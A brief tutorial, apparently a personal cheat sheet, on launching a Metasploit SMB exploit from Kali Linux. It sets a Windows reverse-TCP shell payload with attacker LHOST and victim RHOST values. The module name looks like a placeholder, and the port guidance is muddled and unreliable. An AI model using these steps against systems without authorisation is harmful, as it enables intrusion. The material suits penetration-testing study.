Use Kali Linux.

Prep:
Ensure postgresql is running.
/etc/init.d/postgresql start

Set postgres to start on boot so you don't have to worry about it again:
sudo update-rc.d postgresql enable

	1. From the command line, fire up the Metasploit console:

> msfconsole

	2. Search for exploits related to what you are interested in:

msf> search smb

Or, be more specific:

msf> search name:smb type:exploit platform:windows

Or, in Kali, use searchsploit:

> searchsploit smb

Once you find an exploit you want to use, use it:

msf> use exploit/windows/smb_hack

Then set a payload:

msf> set PAYLOAD windows/shell/reverse_tcp

See what options are set:
msf> show options

Set options as needed:

LHOST is the IP of where the victim host will send info to (your Kali VM, ex.)
msf> set LHOST 192.168.0.x

RHOST is the IP of the victim
msf> set RHOST 192.168.1.x

Default port is 80, but choose one if you wish:
msf> set RPORT 8081

Run the exploit:
msf> exploit
